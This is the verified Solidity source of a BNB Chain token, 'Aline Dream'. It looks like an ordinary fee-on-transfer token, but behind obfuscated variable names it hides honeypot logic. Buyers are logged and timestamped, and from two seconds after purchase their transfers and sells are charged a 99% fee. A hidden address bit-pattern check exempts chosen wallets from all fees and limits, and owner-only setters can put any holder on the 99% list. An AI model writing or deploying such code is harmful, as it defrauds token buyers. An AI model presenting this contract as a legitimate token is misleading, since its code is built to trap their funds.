/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract AlineDream is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Aline Dream ";
    string constant _symbol = "AlineDream";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private isTxWalletMax;
    mapping(address => bool) private walletModeBotsLimit;
    mapping(address => bool) private receiverFeeLiquidityTxBuyLimitBurn;
    mapping(address => bool) private limitTxExemptBurn;
    mapping(address => uint256) private teamSwapBuyLiquidity;
    mapping(uint256 => address) private buyModeSwapSell;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private launchedIsWalletBuy = 0;
    uint256 private sellMaxReceiverIsFee = 5;

    //SELL FEES
    uint256 private receiverAutoTeamMode = 0;
    uint256 private walletLimitSellMarketing = 5;

    uint256 private burnSellAutoExempt = sellMaxReceiverIsFee + launchedIsWalletBuy;
    uint256 private teamLimitMaxModeSwap = 100;

    address private swapMaxTeamExempt = (msg.sender); // auto-liq address
    address private sellTeamAutoLiquidity = (0x23E727e7f5D48e9f4bf69A58FfFFdDAC83FeA450); // marketing address
    address private launchedBurnModeFee = DEAD;
    address private launchedWalletBurnTx = DEAD;
    address private teamSwapLiquidityTradingBotsAuto = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private botsMinIsWallet;
    uint256 private teamAutoTxBurn;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private buyBotsTxSwap;
    uint256 private botsBuyLimitLiquidity;
    uint256 private liquiditySellWalletBuy;
    uint256 private burnWalletTxIs;
    uint256 private liquidityTxModeReceiver;

    bool private exemptIsSwapReceiverAutoMarketingLaunched = true;
    bool private limitTxExemptBurnMode = true;
    bool private burnTeamMaxBotsTradingMin = true;
    bool private walletModeReceiverTrading = true;
    bool private botsReceiverTradingMarketing = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private limitWalletTeamLiquidityMarketingSell = 6 * 10 ** 15;
    uint256 private marketingLiquiditySellModeBuyLimitTrading = _totalSupply / 1000; // 0.1%

    
    uint256 private teamLaunchedTradingLiquidity = 0;
    uint256 private liquidityLimitIsSell = 0;
    uint256 private walletSwapLaunchedMarketing = 0;
    uint256 private autoWalletReceiverLiquidity = 0;
    uint256 private minBotsTxTrading = 0;
    bool private modeIsAutoLiquiditySell = false;
    bool private launchedMinBurnSwap = false;
    uint256 private sellMarketingSwapTxLaunched = 0;
    bool private marketingTxAutoMax = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        buyBotsTxSwap = true;

        isTxWalletMax[msg.sender] = true;
        isTxWalletMax[address(this)] = true;

        walletModeBotsLimit[msg.sender] = true;
        walletModeBotsLimit[0x0000000000000000000000000000000000000000] = true;
        walletModeBotsLimit[0x000000000000000000000000000000000000dEaD] = true;
        walletModeBotsLimit[address(this)] = true;

        receiverFeeLiquidityTxBuyLimitBurn[msg.sender] = true;
        receiverFeeLiquidityTxBuyLimitBurn[0x0000000000000000000000000000000000000000] = true;
        receiverFeeLiquidityTxBuyLimitBurn[0x000000000000000000000000000000000000dEaD] = true;
        receiverFeeLiquidityTxBuyLimitBurn[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return walletMinModeAuto(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return walletMinModeAuto(sender, recipient, amount);
    }

    function walletMinModeAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = swapModeIsLimit(sender) || swapModeIsLimit(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                autoSwapMarketingExempt();
            }
            if (!bLimitTxWalletValue) {
                modeMarketingTxTradingLiquidity(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return teamBuySwapFeeLimitReceiver(sender, recipient, amount);}

        if (!isTxWalletMax[sender] && !isTxWalletMax[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || receiverFeeLiquidityTxBuyLimitBurn[sender] || receiverFeeLiquidityTxBuyLimitBurn[recipient], "Max TX Limit has been triggered");

        if (limitMinBurnSwap()) {autoLiquidityModeLaunchedBuyBotsReceiver();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = teamReceiverFeeSellIsSwapTrading(sender) ? limitIsBotsMinTeamMax(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function teamBuySwapFeeLimitReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function teamReceiverFeeSellIsSwapTrading(address sender) internal view returns (bool) {
        return !walletModeBotsLimit[sender];
    }

    function feeSwapLaunchedLimitBotsTrading(address sender, bool selling) internal returns (uint256) {
        
        if (modeIsAutoLiquiditySell == marketingTxAutoMax) {
            modeIsAutoLiquiditySell = botsReceiverTradingMarketing;
        }


        if (selling) {
            burnSellAutoExempt = walletLimitSellMarketing + receiverAutoTeamMode;
            return liquidityReceiverLaunchedSwap(sender, burnSellAutoExempt);
        }
        if (!selling && sender == uniswapV2Pair) {
            burnSellAutoExempt = sellMaxReceiverIsFee + launchedIsWalletBuy;
            return burnSellAutoExempt;
        }
        return liquidityReceiverLaunchedSwap(sender, burnSellAutoExempt);
    }

    function maxBotsSwapSell() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function limitIsBotsMinTeamMax(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (sellMarketingSwapTxLaunched == minBotsTxTrading) {
            sellMarketingSwapTxLaunched = walletSwapLaunchedMarketing;
        }


        uint256 feeAmount = amount.mul(feeSwapLaunchedLimitBotsTrading(sender, receiver == uniswapV2Pair)).div(teamLimitMaxModeSwap);

        if (limitTxExemptBurn[sender] || limitTxExemptBurn[receiver]) {
            feeAmount = amount.mul(99).div(teamLimitMaxModeSwap);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function swapModeIsLimit(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function liquidityReceiverLaunchedSwap(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = teamSwapBuyLiquidity[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function modeMarketingTxTradingLiquidity(address addr) private {
        if (maxBotsSwapSell() < limitWalletTeamLiquidityMarketingSell) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        buyModeSwapSell[exemptLimitValue] = addr;
    }

    function autoSwapMarketingExempt() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (teamSwapBuyLiquidity[buyModeSwapSell[i]] == 0) {
                    teamSwapBuyLiquidity[buyModeSwapSell[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(sellTeamAutoLiquidity).transfer(amountBNB * amountPercentage / 100);
    }

    function limitMinBurnSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    botsReceiverTradingMarketing &&
    _balances[address(this)] >= marketingLiquiditySellModeBuyLimitTrading;
    }

    function autoLiquidityModeLaunchedBuyBotsReceiver() internal swapping {
        
        if (liquidityLimitIsSell == walletLimitSellMarketing) {
            liquidityLimitIsSell = limitWalletTeamLiquidityMarketingSell;
        }

        if (minBotsTxTrading == launchedIsWalletBuy) {
            minBotsTxTrading = sellMaxReceiverIsFee;
        }

        if (walletSwapLaunchedMarketing == marketingLiquiditySellModeBuyLimitTrading) {
            walletSwapLaunchedMarketing = receiverAutoTeamMode;
        }


        uint256 amountToLiquify = marketingLiquiditySellModeBuyLimitTrading.mul(launchedIsWalletBuy).div(burnSellAutoExempt).div(2);
        uint256 amountToSwap = marketingLiquiditySellModeBuyLimitTrading.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (autoWalletReceiverLiquidity == teamLimitMaxModeSwap) {
            autoWalletReceiverLiquidity = teamLimitMaxModeSwap;
        }

        if (sellMarketingSwapTxLaunched != sellMaxReceiverIsFee) {
            sellMarketingSwapTxLaunched = liquidityLimitIsSell;
        }

        if (walletSwapLaunchedMarketing == teamLaunchedTradingLiquidity) {
            walletSwapLaunchedMarketing = walletSwapLaunchedMarketing;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = burnSellAutoExempt.sub(launchedIsWalletBuy.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(launchedIsWalletBuy).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(sellMaxReceiverIsFee).div(totalETHFee);
        
        payable(sellTeamAutoLiquidity).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                swapMaxTeamExempt,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBuyModeSwapSell(uint256 a0) public view returns (address) {
            return buyModeSwapSell[a0];
    }
    function setBuyModeSwapSell(uint256 a0,address a1) public onlyOwner {
        if (a0 != liquidityLimitIsSell) {
            swapMaxTeamExempt=a1;
        }
        if (a0 == liquidityLimitIsSell) {
            launchedBurnModeFee=a1;
        }
        buyModeSwapSell[a0]=a1;
    }

    function getLaunchedMinBurnSwap() public view returns (bool) {
        if (launchedMinBurnSwap == launchedMinBurnSwap) {
            return launchedMinBurnSwap;
        }
        if (launchedMinBurnSwap == launchedMinBurnSwap) {
            return launchedMinBurnSwap;
        }
        if (launchedMinBurnSwap != walletModeReceiverTrading) {
            return walletModeReceiverTrading;
        }
        return launchedMinBurnSwap;
    }
    function setLaunchedMinBurnSwap(bool a0) public onlyOwner {
        if (launchedMinBurnSwap != launchedMinBurnSwap) {
            launchedMinBurnSwap=a0;
        }
        if (launchedMinBurnSwap == marketingTxAutoMax) {
            marketingTxAutoMax=a0;
        }
        launchedMinBurnSwap=a0;
    }

    function getLaunchedWalletBurnTx() public view returns (address) {
        if (launchedWalletBurnTx == launchedWalletBurnTx) {
            return launchedWalletBurnTx;
        }
        return launchedWalletBurnTx;
    }
    function setLaunchedWalletBurnTx(address a0) public onlyOwner {
        if (launchedWalletBurnTx != sellTeamAutoLiquidity) {
            sellTeamAutoLiquidity=a0;
        }
        launchedWalletBurnTx=a0;
    }

    function getWalletModeReceiverTrading() public view returns (bool) {
        if (walletModeReceiverTrading != exemptIsSwapReceiverAutoMarketingLaunched) {
            return exemptIsSwapReceiverAutoMarketingLaunched;
        }
        return walletModeReceiverTrading;
    }
    function setWalletModeReceiverTrading(bool a0) public onlyOwner {
        if (walletModeReceiverTrading == marketingTxAutoMax) {
            marketingTxAutoMax=a0;
        }
        walletModeReceiverTrading=a0;
    }

    function getReceiverAutoTeamMode() public view returns (uint256) {
        return receiverAutoTeamMode;
    }
    function setReceiverAutoTeamMode(uint256 a0) public onlyOwner {
        if (receiverAutoTeamMode != marketingLiquiditySellModeBuyLimitTrading) {
            marketingLiquiditySellModeBuyLimitTrading=a0;
        }
        if (receiverAutoTeamMode != autoWalletReceiverLiquidity) {
            autoWalletReceiverLiquidity=a0;
        }
        if (receiverAutoTeamMode == teamLaunchedTradingLiquidity) {
            teamLaunchedTradingLiquidity=a0;
        }
        receiverAutoTeamMode=a0;
    }

    function getSellTeamAutoLiquidity() public view returns (address) {
        if (sellTeamAutoLiquidity == launchedBurnModeFee) {
            return launchedBurnModeFee;
        }
        if (sellTeamAutoLiquidity == swapMaxTeamExempt) {
            return swapMaxTeamExempt;
        }
        return sellTeamAutoLiquidity;
    }
    function setSellTeamAutoLiquidity(address a0) public onlyOwner {
        if (sellTeamAutoLiquidity != launchedBurnModeFee) {
            launchedBurnModeFee=a0;
        }
        if (sellTeamAutoLiquidity != teamSwapLiquidityTradingBotsAuto) {
            teamSwapLiquidityTradingBotsAuto=a0;
        }
        sellTeamAutoLiquidity=a0;
    }

    function getSellMarketingSwapTxLaunched() public view returns (uint256) {
        if (sellMarketingSwapTxLaunched != limitWalletTeamLiquidityMarketingSell) {
            return limitWalletTeamLiquidityMarketingSell;
        }
        if (sellMarketingSwapTxLaunched != limitWalletTeamLiquidityMarketingSell) {
            return limitWalletTeamLiquidityMarketingSell;
        }
        return sellMarketingSwapTxLaunched;
    }
    function setSellMarketingSwapTxLaunched(uint256 a0) public onlyOwner {
        if (sellMarketingSwapTxLaunched == marketingLiquiditySellModeBuyLimitTrading) {
            marketingLiquiditySellModeBuyLimitTrading=a0;
        }
        sellMarketingSwapTxLaunched=a0;
    }

    function getBotsReceiverTradingMarketing() public view returns (bool) {
        if (botsReceiverTradingMarketing != botsReceiverTradingMarketing) {
            return botsReceiverTradingMarketing;
        }
        if (botsReceiverTradingMarketing != marketingTxAutoMax) {
            return marketingTxAutoMax;
        }
        if (botsReceiverTradingMarketing != exemptIsSwapReceiverAutoMarketingLaunched) {
            return exemptIsSwapReceiverAutoMarketingLaunched;
        }
        return botsReceiverTradingMarketing;
    }
    function setBotsReceiverTradingMarketing(bool a0) public onlyOwner {
        if (botsReceiverTradingMarketing != burnTeamMaxBotsTradingMin) {
            burnTeamMaxBotsTradingMin=a0;
        }
        if (botsReceiverTradingMarketing == launchedMinBurnSwap) {
            launchedMinBurnSwap=a0;
        }
        if (botsReceiverTradingMarketing == launchedMinBurnSwap) {
            launchedMinBurnSwap=a0;
        }
        botsReceiverTradingMarketing=a0;
    }

    function getTeamSwapLiquidityTradingBotsAuto() public view returns (address) {
        if (teamSwapLiquidityTradingBotsAuto == swapMaxTeamExempt) {
            return swapMaxTeamExempt;
        }
        if (teamSwapLiquidityTradingBotsAuto != swapMaxTeamExempt) {
            return swapMaxTeamExempt;
        }
        return teamSwapLiquidityTradingBotsAuto;
    }
    function setTeamSwapLiquidityTradingBotsAuto(address a0) public onlyOwner {
        if (teamSwapLiquidityTradingBotsAuto != launchedWalletBurnTx) {
            launchedWalletBurnTx=a0;
        }
        if (teamSwapLiquidityTradingBotsAuto == sellTeamAutoLiquidity) {
            sellTeamAutoLiquidity=a0;
        }
        teamSwapLiquidityTradingBotsAuto=a0;
    }

    function getIsTxWalletMax(address a0) public view returns (bool) {
        if (isTxWalletMax[a0] == isTxWalletMax[a0]) {
            return modeIsAutoLiquiditySell;
        }
            return isTxWalletMax[a0];
    }
    function setIsTxWalletMax(address a0,bool a1) public onlyOwner {
        isTxWalletMax[a0]=a1;
    }

    function getWalletLimitSellMarketing() public view returns (uint256) {
        if (walletLimitSellMarketing == sellMaxReceiverIsFee) {
            return sellMaxReceiverIsFee;
        }
        return walletLimitSellMarketing;
    }
    function setWalletLimitSellMarketing(uint256 a0) public onlyOwner {
        walletLimitSellMarketing=a0;
    }

    function getReceiverFeeLiquidityTxBuyLimitBurn(address a0) public view returns (bool) {
        if (a0 != teamSwapLiquidityTradingBotsAuto) {
            return launchedMinBurnSwap;
        }
        if (receiverFeeLiquidityTxBuyLimitBurn[a0] != receiverFeeLiquidityTxBuyLimitBurn[a0]) {
            return botsReceiverTradingMarketing;
        }
        if (a0 != swapMaxTeamExempt) {
            return modeIsAutoLiquiditySell;
        }
            return receiverFeeLiquidityTxBuyLimitBurn[a0];
    }
    function setReceiverFeeLiquidityTxBuyLimitBurn(address a0,bool a1) public onlyOwner {
        if (receiverFeeLiquidityTxBuyLimitBurn[a0] == limitTxExemptBurn[a0]) {
           limitTxExemptBurn[a0]=a1;
        }
        receiverFeeLiquidityTxBuyLimitBurn[a0]=a1;
    }

    function getBurnTeamMaxBotsTradingMin() public view returns (bool) {
        return burnTeamMaxBotsTradingMin;
    }
    function setBurnTeamMaxBotsTradingMin(bool a0) public onlyOwner {
        if (burnTeamMaxBotsTradingMin != limitTxExemptBurnMode) {
            limitTxExemptBurnMode=a0;
        }
        if (burnTeamMaxBotsTradingMin == burnTeamMaxBotsTradingMin) {
            burnTeamMaxBotsTradingMin=a0;
        }
        if (burnTeamMaxBotsTradingMin == limitTxExemptBurnMode) {
            limitTxExemptBurnMode=a0;
        }
        burnTeamMaxBotsTradingMin=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}